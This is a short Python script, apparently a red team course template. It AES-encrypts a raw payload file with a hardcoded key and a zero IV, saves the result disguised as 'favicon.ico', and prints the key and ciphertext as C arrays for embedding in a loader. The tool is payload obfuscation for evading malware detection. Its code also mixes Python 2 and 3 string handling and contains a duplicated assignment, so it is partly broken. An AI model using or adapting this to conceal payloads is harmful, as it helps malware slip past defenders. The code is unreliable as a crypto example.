# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

#KEY = urandom(16)
KEY = "obama"


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
	print(plaintext, key)
	k = hashlib.sha256(key).digest()
	print(len(k))
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))

def aes_dec(ciphertext, key):
	iv = 16 * '\x00'
	k = k = hashlib.sha256(key).digest()
	print(len(k))
	decrypt_cipher = AES.new(k, AES.MODE_CBC, iv)
	plaintext = decrypt_cipher.decrypt(ciphertext)

	return plaintext
	
def printC(ciphertext):
	
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

try:
	plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()
  
#plaintext = "VirtualAllocEx"

ciphertext = aesenc(plaintext, KEY)
print(ciphertext)
	
decrypted = aes_dec(ciphertext, KEY)
print(decrypted)


with open("favicon.ico", "wb") as f:
	f.write(ciphertext)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
